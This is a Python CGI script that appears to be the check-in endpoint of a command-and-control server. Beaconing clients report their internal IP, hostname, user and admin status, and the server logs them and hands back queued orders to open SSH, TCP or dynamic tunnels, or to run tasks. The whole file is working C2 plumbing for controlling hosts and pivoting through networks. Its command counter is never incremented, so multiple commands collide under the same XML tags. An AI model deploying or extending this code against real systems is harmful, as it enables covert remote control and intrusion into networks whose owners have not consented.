#!/usr/bin/python
import cgi, cgitb
import sys
import os
from xml.etree import ElementTree
import psycopg2
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.db_connection import get_db_connection
from core.session_helper import get_session_cookie, get_session_username

def send_xml_response(content, status_code=200):
    if status_code != 200:
        print(f"Status: {status_code}")
    print("Content-Type: application/xml\n")
    print(content)

def map_command(command):
    if command == "opensshtunnel":
        return "OpenSSHTunnel"
    if command == "closesshtunnel":
        return "CloseSSHTunnel"
    if command == "opentcptunnel":
        return "OpenTCPTunnel"
    if command == "closetcptunnel":
        return "CloseTCPTunnel"
    if command == "opendynamictunnel":
        return "OpenDynamicTunnel"
    if command == "task":
        return "Task"
    
def commands_to_xml_string(commands):
    root = ElementTree.Element("Beacon")
    cnt = 1
    for command in commands:
        ElementTree.SubElement(root, "Command"+str(cnt)).text = map_command(command[1])
        ElementTree.SubElement(root, "Command"+str(cnt)+"Param").text = "L"+str(command[2])+"R"+str(command[3])    
    return ElementTree.tostring(root).decode()

try:
    form = cgi.FieldStorage()
    if "info" not in form:
        raise ValueError("Invalid request data")
    
    info = form["info"].value
    
    rootElement = ElementTree.fromstring(info)
        
    internal_ip = rootElement.find("InternalIP")
    host_name = rootElement.find("HostName")
    current_user = rootElement.find("CurrentUser")
    admin = rootElement.find("Admin")
    ping_interval = rootElement.find("PingInterval")
    
    if any(x is None for x in [internal_ip, host_name, current_user, admin, ping_interval]):
         raise ValueError("Missing required XML fields")
    
    internal_ip = internal_ip.text
    host_name = host_name.text
    current_user = current_user.text
    admin = admin.text
    update_interval = ping_interval.text

    db_connection = None
    db_cursor = None
    
    db_connection = get_db_connection()
    db_cursor = db_connection.cursor()
    db_cursor.execute("""select * from clients where hostname = %s and internalip = %s and currentuser = %s and admin = %s""", (host_name, internal_ip, current_user, admin))
    
    rows = db_cursor.fetchall()
    
    if not rows:
        db_cursor.execute("""insert into clients (hostname, internalip, currentuser, admin, lastping, pinginterval) values (%s, %s, %s, %s, NOW(), %s)""",
            (host_name, internal_ip, current_user, admin, update_interval))
        db_connection.commit()
    else:
        for row in rows:
            db_cursor.execute("update clients set lastping = NOW() where id = %s", (str(row[0]),))
            db_connection.commit()
    
            if (update_interval != row[5]):
                db_cursor.execute("update clients set pinginterval = %s where id = %s", (update_interval, str(row[0])))
                db_connection.commit()
    
            db_cursor.execute("select id, cmd, local_port, remote_port from commands where clients_id = %s and released = true and executed = false and marked_as_deleted = false", (str(row[0]),))
            commands = db_cursor.fetchall()
            commands_xml_tree = commands_to_xml_string(commands)
            print("Content-Type: application/xml\n")
            print(commands_xml_tree)
            for command in commands:
                db_cursor.execute("update commands set executed = true where id = %s", (command[0],))
            db_connection.commit()

except Exception as e:
    send_xml_response("<Error>An error occurred while processing your request</Error>", status_code=500)        
finally:
    if db_cursor is not None:
            db_cursor.close()
    if db_connection is not None:
        db_connection.close()
